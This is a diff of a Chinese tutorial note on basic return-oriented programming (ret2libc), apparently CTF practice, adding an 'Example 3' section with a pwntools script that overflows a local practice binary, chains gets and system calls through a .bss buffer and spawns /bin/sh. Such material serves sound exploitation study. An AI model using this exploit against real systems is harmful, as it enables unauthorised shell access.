@@ -1,4 +1,4 @@
-# **基本ROP-**ret2libc(1)
+# 基本ROP-ret2libc
 
 > 参考：[ret2syscall-Cyberangel](https://www.yuque.com/cyberangel/rg9gdm/crpf61#h2-7) 
 >
@@ -186,3 +186,26 @@ sh.interactive()
 
 
 成功getshell
+
+
+
+## 示例3
+
+
+
+**EXP**
+
+```python
+from pwn import *
+bss_addr = 0x0804A080
+gets_plt = 0x08048460
+sys_plt  = 0x08048490
+
+io=process('./ret2libc2')
+io.recvuntil('What do you think ?')
+payload = flat(['A'*112,gets_plt,sys_plt,bss_addr,bss_addr])
+io.sendline(payload)
+io.sendline('/bin/sh')
+io.interactive()
+```
+
